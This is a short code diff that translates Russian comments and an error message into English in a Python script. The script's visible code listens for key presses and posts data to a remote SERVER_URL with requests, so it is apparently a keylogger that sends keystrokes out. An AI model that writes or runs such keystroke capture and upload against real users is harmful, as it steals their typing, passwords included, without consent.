@@ -12,11 +12,11 @@ def on_press(key):
     try:
         requests.post(SERVER_URL, json=data)
     except Exception as e:
-        print("Ошибка при отправке:", e)
+        print("sending error:", e)
 
-    # Останавливаем по Esc
+    # stop by ESC
     if key == keyboard.Key.esc:
-        return False   # Listener завершится
+        return False   # Listener stopped
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
